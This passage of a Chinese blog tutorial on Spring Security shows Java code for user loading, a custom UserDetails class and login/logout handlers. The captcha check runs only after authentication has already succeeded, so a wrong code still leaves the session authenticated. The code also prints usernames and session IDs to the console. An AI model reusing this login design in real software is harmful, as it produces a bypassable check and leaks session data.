punctuation\">.</span><span class=\"token constant\">ALTER_PASSWORD_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ALTER_PASSWORD_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">User</span> <span class=\"token function\">selectUserByName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> user<span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token comment\">// 登录逻辑</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UserDetails</span> <span class=\"token function\">loadUserByUsername</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">UsernameNotFoundException</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">></span></span> simpleGrantedAuthorities <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseMapper<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByUserName</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// System.out.println(user);</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">></span></span> roleIdList <span class=\"token operator\">=</span> userRoleService<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserId</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> roleId <span class=\"token operator\">:</span> roleIdList<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                    <span class=\"token class-name\">Role</span> role <span class=\"token operator\">=</span> roleService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>roleId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                    simpleGrantedAuthorities<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ROLE_\"</span> <span class=\"token operator\">+</span> role<span class=\"token punctuation\">.</span><span class=\"token function\">getRoleName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token punctuation\">&#125;</span>\n\n                <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">></span></span> permissionIdList <span class=\"token operator\">=</span> userPermissionService<span class=\"token punctuation\">.</span><span class=\"token function\">selectByUserId</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span> permissionId <span class=\"token operator\">:</span> permissionIdList<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n                    <span class=\"token class-name\">Permission</span> permission <span class=\"token operator\">=</span> permissionService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>permissionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                    simpleGrantedAuthorities<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleGrantedAuthority</span><span class=\"token punctuation\">(</span>permission<span class=\"token punctuation\">.</span><span class=\"token function\">getPermissionName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token punctuation\">&#125;</span>\n\n\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> simpleGrantedAuthorities<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> simpleGrantedAuthorities<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"创建自己的User认证类\"><a href=\"#创建自己的User认证类\" class=\"headerlink\" title=\"创建自己的User认证类\"></a>创建自己的User认证类</h3><p>实现UserDetial接口</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyUser</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">UserDetails</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> password<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> grantedAuthorities<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> password<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> grantedAuthorities<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>grantedAuthorities <span class=\"token operator\">=</span> grantedAuthorities<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Collection</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">GrantedAuthority</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">getAuthorities</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>grantedAuthorities<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isAccountNonExpired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isAccountNonLocked</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isCredentialsNonExpired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">isEnabled</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"添加处理器\"><a href=\"#添加处理器\" class=\"headerlink\" title=\"添加处理器\"></a>添加处理器</h3><h4 id=\"登录成功处理器\"><a href=\"#登录成功处理器\" class=\"headerlink\" title=\"登录成功处理器\"></a>登录成功处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LoginSuccessHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuthenticationSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// private String url;</span>\n\n    <span class=\"token comment\">// public LoginSuccessHandler(String url)&#123;</span>\n    <span class=\"token comment\">//     this.url = url;</span>\n    <span class=\"token comment\">// &#125;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onAuthenticationSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">// 获取客户端ip</span>\n        <span class=\"token comment\">// System.out.println(request.getRemoteAddr());</span>\n\n        <span class=\"token comment\">// 获取SpringSecurity里面的User对象</span>\n        <span class=\"token comment\">// User user = (User) authentication.getPrincipal();</span>\n        <span class=\"token comment\">// 获取权限列表</span>\n        <span class=\"token comment\">// System.out.println(user.getAuthorities());</span>\n        <span class=\"token comment\">//  获取用户名</span>\n        <span class=\"token comment\">// System.out.println(user.getUsername());</span>\n        <span class=\"token comment\">// 获取用户密码，null，为了安全</span>\n        <span class=\"token comment\">// System.out.println(user.getPassword());</span>\n        <span class=\"token comment\">// response.sendRedirect(this.url);</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">HttpSession</span> session <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> id <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Authentication authentication = SecurityContextHolder.getContext().getAuthentication();</span>\n            <span class=\"token comment\">// System.out.println(authentication.getPrincipal());</span>\n\n            <span class=\"token class-name\">MyUser</span> principal <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MyUser</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">SecurityContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">getAuthentication</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">getPrincipal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">BeanUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">copyProperties</span><span class=\"token punctuation\">(</span>principal<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span>\n                    <span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\n            writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">VALIDATE_CODE_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">VALIDATE_CODE_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"登录失败处理器\"><a href=\"#登录失败处理器\" class=\"headerlink\" title=\"登录失败处理器\"></a>登录失败处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LoginFailHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuthenticationFailureHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onAuthenticationFailure</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuthenticationException</span> exception<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">String</span> code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_FAIL</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGIN_FAIL</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"登出成功处理器\"><a href=\"#登出成功处理器\" class=\"headerlink\" title=\"登出成功处理器\"></a>登出成功处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LogoutSuccessHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>security<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>authentication<span class=\"token punctuation\">.</span>logout<span class=\"token punctuation\">.</span></span>LogoutSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onLogoutSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span 